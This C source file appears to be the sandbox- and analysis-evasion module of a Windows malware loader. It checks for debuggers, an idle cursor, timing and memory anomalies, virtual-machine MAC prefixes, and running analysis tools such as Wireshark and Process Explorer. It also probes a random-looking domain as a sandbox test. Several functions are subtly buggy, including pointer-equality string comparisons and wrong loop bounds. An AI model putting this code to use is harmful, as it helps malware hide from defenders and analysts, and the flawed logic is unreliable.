#include "headers.h"

int check_debugger(){

    if(IsDebuggerPresent()){
        return 1;
    }
    return 0;
}

int check_cursor_pos(){

    POINT p1;
    POINT p2;

    GetCursorPos(&p1);
    Sleep(5000);
    GetCursorPos(&p2);

    if((p1.x == p2.x) && (p1.y == p2.y)){
        return 1;
    }

    return 0;
}

int check_memory_alloc(){

    char *memdump = NULL;
    memdump = malloc(MAXMEMORY);

    if(memdump != NULL){
        memset(memdump, 0, MAXMEMORY);
        free(memdump);
        return 0;
    }

    return 1;
}


int check_operation(){

    int counter = 0;

    for(int i=0; i<OPERATION_MAX; i++){
        counter++;
    }

    if(counter == OPERATION_MAX){
        return 0;
    }

    return 1;
}


int check_my_name(char *name){

    if(strstr(name, "loader.exe") > 0){
        return 0;
    }

    return 1;
}

int check_url(){

    char url[] = "http://www.ixqwgwlcfsqhcyqu.com/";
    HINTERNET http_open, url_open;

    http_open = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    url_open = InternetOpenUrl(http_open, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);

    if(!url_open){
        InternetCloseHandle(http_open);
        InternetCloseHandle(url_open);
        return 0;
    }

    InternetCloseHandle(http_open);
    InternetCloseHandle(url_open);
    return 1;
}


int check_mac(){

    char *macs[] = {"080027", "000569", "000C29", "001C14", "005056", "001C42", "00163E", "0A0027", "005056"};
    PIP_ADAPTER_INFO adapter_info;

    DWORD buffer_len = sizeof(adapter_info);
    char *mac_addr = malloc(17 * sizeof(char));
    adapter_info = malloc(sizeof(IP_ADAPTER_INFO));

    if(adapter_info == NULL){
        return 1;
    }

    if(GetAdaptersInfo(adapter_info, &buffer_len) == ERROR_BUFFER_OVERFLOW){
        adapter_info = malloc(buffer_len);

        if(adapter_info == NULL){
            return 1;
        }
    }

    if(GetAdaptersInfo(adapter_info, &buffer_len) == NO_ERROR){
        PIP_ADAPTER_INFO adpt_info = adapter_info;

        do{
            sprintf(mac_addr, "%02X%02X%02X", adpt_info->Address[0], adpt_info->Address[1], adpt_info->Address[2]);

            for(int i = 0; i < sizeof(macs); i++){
                if( macs[i] == mac_addr){
                    return 1;
                }
            }

            adpt_info = adpt_info->Next;
        }while(adpt_info);
    }

    free(adapter_info);
    return 0;
}

int check_processes(){

    DWORD processes_id[2048];
    DWORD processes_id_size;
    DWORD num_processes;
    int check = 0;

    if(!EnumProcesses(processes_id, sizeof(processes_id), &processes_id_size)){
        return 1;
    }

    num_processes = processes_id_size/sizeof(DWORD);

    for (unsigned int i = 0; i < num_processes; i++ ){
        check = check_modules(processes_id[i]);

        if(check == 1){
            return 1;
        }
    }

    return 0;
}

int check_modules(DWORD process_id){

    HMODULE h_modules[2048];
    HANDLE h_process;
    DWORD num_modules;
    char *process[] = {"vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vmware", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs", "vmtoolsd"};

    h_process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_id);

    if (h_process == NULL){
        return 1;
    }

    if(EnumProcessModules(h_process, h_modules, sizeof(h_modules), &num_modules)){
        for (unsigned int i = 0; i < (num_modules/sizeof(HMODULE)); i++){
            char module_name[MAX_PATH];

            if ( GetModuleFileNameEx(h_process, h_modules[i], module_name, sizeof(module_name)/sizeof(char))){
                if(strstr(module_name, ".exe") > 0){
                    for(int j = 0; j < sizeof(process)/sizeof(char **); j++){
                        if(StrStrIA(module_name, process[j])){
                            return 1;
                        }
                    }
                }
            }
        }
    }

    CloseHandle(h_process);
    return 0;
}

int check_tick_count(){

    unsigned long int h1, h2;

    h1 = GetTickCount()/1000;
    Sleep(5000);
    h2 = GetTickCount()/1000;

    if( h2-h1 != 5 ){
        return 1;
    }

    return 0;
}